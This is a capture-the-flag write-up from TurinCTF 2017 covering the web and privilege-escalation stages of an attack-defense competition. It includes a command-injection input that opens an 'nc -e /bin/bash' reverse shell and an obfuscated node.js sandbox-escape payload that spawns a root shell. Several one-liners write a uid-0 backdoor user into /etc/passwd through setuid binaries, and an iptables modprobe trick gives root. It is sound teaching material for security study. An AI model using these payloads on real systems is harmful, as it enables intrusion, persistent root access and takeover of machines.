---
layout: post
title:  "TurinCTF 2017 - Finals"
date:   2017-11-28 00:05
categories: [TurinCTF2017]
tags: [Web, Pwn]
author: jbz
---

The [Turin Cybersec Hackaton](https://cybersec.jetop.com/) was organized by the guys at JeTOP, in collaboration with KPMG, Shielder and the PoliTO University.

***Note*** If you have solved a challenge that you don't see listed here and you have material/source-code or you want to write a writeup, write to us on telegram in the `@CapTheFlag` group. ;)

***TL;DR***
The CTF was an Attack-Defense type. 
Most of the VMs were made of 2 parts, Web and PrivEsc.

The target for the web part was to gain code execution thru a reverse-shell,  
then you had to escalate to `root` to write the `/flag/flag` file and patch the VM.

Since I don't remember the exact pairs of Web-PrivEsc and I don't remember their name either,  
I will just list random things in random order. :)

## Web

### 1

The VM had 2 open port, `80` and `1337`.  
Port `1337` was dropping our packets.  
The website was asking for username and password.  

We ran `dirbuster` and find out the `app/app-release.apk` file.

Decompiled with [apk2java](https://github.com/TheZ3ro/apk2java-linux) we get this source:

	package it.shielder.securelogin;

	import android.view.View;
	import java.text.SimpleDateFormat;
	import java.util.Calendar;
	import java.util.Date;

	public class WIPClass {
	    public void Get(View object) {
	        object = Calendar.getInstance();
	        object = new SimpleDateFormat("ddMMyyyy").format(object.getTime());
	        String string2 = new String(new byte[]{97, 115, 103, 97, 100, 97, 114, 105, 100, 100, 117});
	        (String)object + string2;
	    }
	}

If we run this chunk of code we find out that the passowrd is:
`$pass_today = $date_today . "asgadariddu";`

We login in with as `admin` and we get redirected to `check_turbine.php` page.

Here you can insert an ip address and ping it.  
The website checks if the input have `;` in it (for preventing multiple command chaining) but alternatively you can use `&` or `\n` (`%0a`).

Send `ip="10.105.10.79 %0a nc -e /bin/bash 10.105.10.79 2020"` to spawn a reverse shell.


## Privilege Escalation

Once you gain a shell access to a VM there are a few thing you should check out:

 - setuid executables (`find / -perm -4000 2>/dev/null`) 
 - crontabs (`crontab -l`, `cat /etc/crontab`, `ls /var/spool/cron/crontabs/`)
 - sudoers (`cat /etc/sudoers`)
 - running services/processes (`ps aux`, `lsof`, `systemctl status`)
 - check for mount options
 - ...

### 1

There was a service running on `1337` available only for `localhost`, ran as `root`.
Now we can connect to it from our reverse shell.

Connecting to it we can see a strange prompt

	REMOTE AMMINISTATION TOOL (beta)

	#>

We tested some inputs

	#> a[0]=1
	Dangerous characters detected

	Phone #> console.log(1)
	Dangerous characters detected

	#> eval
	function eval() { [native code] }

This is node.js, but unfortunately some characters were filtered, like `[]./`.

We can bypass the filter on `.` with this function `function punto(i){ for (c of __filename){ if (i > -9) {i--} else return c } }` since filename is `/root/rat.js`.

Sending `this` as input show us the source code. Unfortunately we discovered that many STD classes were overwritten in the eval context.

	var line = "";

    var call,Array,ArrayBuffer,Boolean,Buffer,DTRACE_HTTP_CLIENT_REQUEST,DTRACE_HTTP_CLIENT_RESPONSE,DTRACE_HTTP_SERVER_REQUEST,DTRACE_HTTP_SERVER_RESPONSE,DTRACE_NET_SERVER_CONNECTION,DTRACE_NET_STREAM_END,DataView,Date,Error,EvalError,Float32Array,Float64Array,Function,Int16Array,Int32Array,Int8Array,Map,Number,Object,Promise,Proxy,RangeError,ReferenceError,Set,String,Symbol,SyntaxError,TypeError,URIError,Uint16Array,Uint32Array,Uint8Array,Uint8ClampedArray,WeakMap,WeakSet,__defineGetter__,__defineSetter__,__lookupGetter__,__lookupSetter__,assert,call,clearImmediate,clearInterval,clearTimeout,constructor,decodeURI,decodeURIComponent,encodeURI,encodeURIComponent,escape,events,flag,global,hasOwnProperty,isFinite,isNaN,isPrototypeOf,parseFloat,parseInt,process,propertyIsEnumerable,require,rl,setImmediate,setInterval,setTimeout,stream,template,toLocaleString,toString,unescape,valueOf;

    if(new RegExp(/[\[\]\.\\\+\/;,=]/).test(number)){
        console.log("Dangerous characters detected");
        throw 123;
        return;
    }

    if(new RegExp(/with/i).test(number)){
        console.log("Dangerous characters detected");
        throw 123;
        return;
    }
    arguments = undefined;

    console.log(eval(number));

In javascript you can change context with the `with` [statement](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Statements/with) 

Since `with` is filtered with a simple regex, we can bypass that check by using ``w${line}ith`` instead, `line` is declared empty in the source code above. 
Making good use of [Template Literals](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Template_literals).

Finally we can simply eval our payload in the `global` [context](https://nodejs.org/dist/latest-v6.x/docs/api/globals.html#globals_global) to get access to all the jailed functions.

This will spawn a reverse-shell as root:

	function punto(i){ for (c of __filename){ if (i > -9) {i--} else return c } } eval(`w${line}ith (root) { eval(decodeURIComponent("module%2erequire('child_process')%2eexec('nc%20-e%20%2Fbin%2Fbash%2010%2e105%2e10%2e79%204444')")) }`)


### 2, 3, 4, 5

In many VMs there were `setuid` executables.

Here it's just a matter of appending a line into `/etc/passwd`.

Our line was `jbz:AjNoV1Tjj0tSc:0:0:jbz:/root:/bin/bash` (user `jbz`, password `jbz`, uid `0`, home `/root`)

After adding the line just run `su jbz` or `ssh jbz@hostname`

#### find

`find /etc/passwd -exec sh -c "echo jbz:AjNoV1Tjj0tSc:0:0:jbz:/root:/bin/bash >> {}" \;`

#### mawk

`mawk 'END{print "jbz:AjNoV1Tjj0tSc:0:0:jbz:/root:/bin/bash" >> "/etc/passwd"}'`

#### sed

`sed -i '$ a jbz:AjNoV1Tjj0tSc:0:0:jbz:/root:/bin/bash' /etc/passwd`

#### tar

Having tar with `setuid` we can compress a `/etc/passwd` file with our `jbz` user, and decompress it in the `/etc` folder, overwriting the system `passwd` file.

`tar -xzvf passwd.tar.gz -C /etc`

### 6

In a VM there was `iptables` in the `/etc/sudoers` file with `NOPASSWD` option.  
This means you can run `sudo iptables` as root without inserting the root's password.

#### iptables

We need to get command execution with `iptables`.

Reading the manpage we discovered this option:

	--modprobe=command
        When adding or inserting rules into a chain, use command to load
        any necessary modules (targets, match extensions, etc).


In the `/etc/modprobe.d/iptables.conf` file the `nat` table was blacklisted (and not loaded).  
This way we can use the `--modprobe` option on the `nat` table to execute a custom script.

	$ echo -e "#!/bin/sh\n/bin/sh" > /tmp/shell
	$ chmod +x /tmp/shell
	$ sudo iptables -L -t nat --modprobe=/tmp/shell
	# whoami
	root

